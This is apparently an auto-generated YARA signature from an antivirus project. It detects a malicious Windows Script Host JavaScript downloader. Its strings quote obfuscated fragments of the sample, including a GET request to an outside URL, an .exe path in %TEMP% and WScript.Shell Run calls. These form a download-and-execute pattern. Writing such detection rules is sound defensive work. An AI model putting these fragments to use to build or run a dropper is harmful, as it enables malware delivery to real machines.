rule sig_20160329_90e0768d07258051714a8bbfe66b6acb {
  meta:
    description = "datamaliciousorder - file 20160329_90e0768d07258051714a8bbfe66b6acb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b06542888963220c5a1944f8b1508bd596d4d7c3ade7507ecbaa923ba8e496c"

  strings:
    $s1  = "Pg[k](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function HB() {return t[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mam6hXc3tP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[jA](B() * 11); if (Pg[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function x(b, w0){Ep = Ep * 1; return b - w0;};" fullword ascii
    $s5  = "var t = function gy() {return WScript[Rh](\"WScript.Shell\");}(), fa = 11;" fullword ascii
    $s6  = "function Y(){return \"\" + w;};" fullword ascii
    $s7  = "function vB(i){t[\"Run\"](i, Ep, Ep);};" fullword ascii
    $s8  = "function Z() {return ((il == true) && (il == N0)) ? 1 : Ep;};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "function N()" fullword ascii
    $s11 = "function gj(Y0) {var Jz = (1, 2, 3, 4, 5, Y0); return Jz;};" fullword ascii
    $s12 = " while (DF){" fullword ascii
    $s13 = "return x(f, gN);" fullword ascii
    $s14 = "function u(){return Rh;};" fullword ascii
    $s15 = "var qb = new this[\"Date\"]();" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "var K0 = false;" fullword ascii
    $s19 = "var il = false;" fullword ascii
    $s20 = "il = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}